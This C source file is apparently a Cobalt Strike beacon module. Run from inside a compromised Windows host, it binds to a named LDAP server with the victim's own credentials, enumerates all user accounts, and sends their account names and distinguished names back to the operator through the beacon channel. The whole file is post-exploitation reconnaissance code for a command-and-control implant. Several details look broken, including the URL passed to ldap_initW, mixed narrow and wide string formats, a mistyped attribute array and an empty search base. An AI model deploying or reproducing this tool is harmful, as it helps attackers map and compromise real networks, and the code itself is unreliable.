#include <windows.h>
#include <winldap.h>
#include "beacon.h"

#pragma comment(lib, "wldap32.lib")

#define LDAP_PORT 389

static void ldap_query(const char *host) {
    LDAP *ld = NULL;
    ULONG version = LDAP_VERSION3;
    ULONG rc;
    WCHAR wcHost[256];
    WCHAR wcFilter[256];
    LDAPMessage *result = NULL, *entry;
    PWCHAR *attrs[] = { L"distinguishedName", L"sAMAccountName", L"memberOf", NULL };
    int i;

    // Convert host to wide string and prepend LDAP://
    swprintf(wcHost, 256, L"LDAP://%s", host);
    ld = ldap_initW(wcHost, LDAP_PORT);
    if (!ld) {
        BeaconPrintf(CALLBACK_ERROR, "ldap_initW failed");
        return;
    }

    ldap_set_optionW(ld, LDAP_OPT_PROTOCOL_VERSION, &version);

    rc = ldap_connect(ld, NULL);
    if (rc != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "ldap_connect: %s", ldap_err2stringW(rc));
        ldap_unbind(ld);
        return;
    }

    // Use SSPI – no explicit credentials needed
    rc = ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (rc != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "ldap_bind_s: %s", ldap_err2stringW(rc));
        ldap_unbind(ld);
        return;
    }

    // Search for user objects
    swprintf(wcFilter, 256, L"(objectClass=user)");
    rc = ldap_search_sW(ld, L"", LDAP_SCOPE_SUBTREE, wcFilter, attrs, 0, &result);
    if (rc != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "ldap_search_sW: %s", ldap_err2stringW(rc));
        ldap_unbind(ld);
        return;
    }

    for (entry = ldap_first_entry(ld, result); entry != NULL; entry = ldap_next_entry(ld, entry)) {
        WCHAR *dn = ldap_get_dnW(ld, entry);
        PWCHAR *sam = ldap_get_valuesW(ld, entry, L"sAMAccountName");
        if (sam && sam[0]) {
            char json[1024];
            snprintf(json, sizeof(json),
                     "{\"type\":\"user\",\"name\":\"%S\",\"distinguishedName\":\"%S\"}",
                     sam[0], dn);
            BeaconOutput(CALLBACK_OUTPUT, json, (DWORD)strlen(json));
        }
        if (dn) ldap_memfreeW(dn);
        if (sam) ldap_value_freeW(sam);
    }

    ldap_msgfree(result);
    ldap_unbind(ld);
}

void go(char *args, int len) {
    datap parser;
    char *host = NULL;

    BeaconDataParse(&parser, args, len);
    host = BeaconDataExtract(&parser, NULL);
    if (!host) {
        BeaconPrintf(CALLBACK_ERROR, "Usage: <host>");
        return;
    }

    ldap_query(host);
}
